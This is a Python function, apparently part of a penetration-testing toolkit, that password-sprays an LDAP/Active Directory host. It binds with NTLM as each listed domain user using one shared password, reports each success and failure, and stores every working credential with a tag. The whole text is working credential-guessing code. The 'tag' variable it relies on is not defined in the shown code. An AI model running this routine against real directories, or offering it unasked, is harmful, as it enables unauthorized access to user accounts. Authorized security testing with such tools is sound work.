def bruteforce(users, domain, password, host):
    """
        Performs a bruteforce for the given users, password, domain on the given host.
    """
    cs = CredentialSearch(use_pipe=False)

    print_notification("Connecting to {}".format(host))

    s = Server(host)
    c = Connection(s)

    for user in users:
        if c.rebind(user="{}\\{}".format(domain, user.username), password=password, authentication=NTLM):
            print_success('Success for: {}:{}'.format(user.username, password))
            credential = cs.find_object(
                user.username, password, domain=domain, host_ip=host)
            if not credential:
                credential = Credential(username=user.username, secret=password,
                                        domain=domain, host_ip=host, type="plaintext", port=389)
            credential.add_tag(tag)
            credential.save()

            # Add a tag to the user object, so we dont have to bruteforce it again.
            user.add_tag(tag)
            user.save()
        else:
            print_error("Fail for: {}:{}".format(user.username, password))